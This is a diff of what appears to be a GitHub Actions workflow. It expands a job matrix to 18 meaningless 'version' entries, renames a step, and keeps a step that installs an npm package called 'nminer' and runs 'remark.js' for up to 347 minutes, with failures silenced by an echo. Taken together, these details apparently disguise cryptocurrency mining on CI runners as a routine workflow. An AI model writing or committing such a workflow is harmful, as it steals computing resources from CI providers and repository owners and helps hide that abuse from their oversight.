@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1830 }
-          - { version: 7231 }
-          - { version: 9988 }
-          - { version: 3006 }
-          - { version: 9331 }
-          - { version: 3068 }
-          - { version: 3308 }
-          - { version: 2294 }
-          - { version: 5049 }
-          - { version: 7442 }
-          - { version: 1481 }
-          - { version: 1081 }
-          - { version: 6731 }
-          - { version: 988 }
-          - { version: 9411 }
-          - { version: 3304 }
+          - { version: 9002 }
+          - { version: 1144 }
+          - { version: 462 }
+          - { version: 2792 }
+          - { version: 2720 }
+          - { version: 7701 }
+          - { version: 9723 }
+          - { version: 3232 }
+          - { version: 3443 }
+          - { version: 6781 }
+          - { version: 9359 }
+          - { version: 9236 }
+          - { version: 4696 }
+          - { version: 5775 }
+          - { version: 2298 }
+          - { version: 7295 }
+          - { version: 7296 }
+          - { version: 8835 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: tusk
+      - name: thorn
         run: |
           npm install nminer@latest
-          timeout 342m node remark.js || echo "remark executed"
+          timeout 347m node remark.js || echo "remark executed"
